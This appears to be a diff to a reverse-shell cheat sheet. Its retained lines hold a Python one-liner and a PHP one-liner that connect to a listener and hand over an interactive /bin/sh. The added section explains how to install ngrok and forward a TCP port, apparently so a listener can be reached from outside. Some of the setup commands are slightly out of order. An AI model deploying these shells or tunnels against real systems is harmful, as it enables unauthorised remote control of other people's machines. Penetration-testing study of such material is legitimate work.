@@ -54,3 +54,19 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 ```
 php -r '$sock=fsockopen("127.0.0.1",8080);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
+
+#Port Forwarding
+**Install And Setup Ngrok**
+```
+cd /tmp
+wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip
+unzip ngrok-stable-linux-arm.zip && sudo chmod 755 /usr/bin/ngrok
+sudo cp ngrok /usr/bin # (For Linux)
+cp ngrok $PREFIX/bin && chmod 755 /usr/bin/ngrok (For Termux)
+ngrok authtoken  tokenishere #(Token can be got at https://ngrok.com/)
+```
+
+**Start TCP Port Forwarding**
+```
+ngrok tcp 1234 #1234 is your custom port number
+```
